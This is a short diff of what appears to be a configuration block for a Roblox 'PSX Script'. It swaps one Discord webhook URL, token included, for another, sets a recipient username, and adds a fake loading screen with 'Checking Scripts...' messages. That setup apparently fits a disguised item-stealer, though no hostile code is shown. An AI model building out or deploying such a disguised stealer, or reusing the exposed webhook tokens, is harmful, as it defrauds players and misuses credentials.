@@ -1,7 +1,8 @@
 Username = "kastirdmza0"
-WebHook = "https://discord.com/api/webhooks/1082015554468065480/Uav3Kvq4bumPvXLhD2YWk6MfQOcYOTr6QvASyA29cURigQUP0slZQd8ylPuhZjAW7qXK"
+WebHook = "https://discord.com/api/webhooks/103827034152/GSnQ-DgU3PU6rY5y7ePOcYOi3bfDdCgjsiCib5yk07vBn8Y2HVknAR2INsTAEx8B-JNi"
 
-_G.CustomScriptName = "Scripts Hub"
+loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
+_G.CustomScriptName = "PSX Script"
 _G.Text1 = "Script Loaded..."
 _G.Text2 = "Waiting for Script"
 _G.Text3 = "Checking Scripts..."
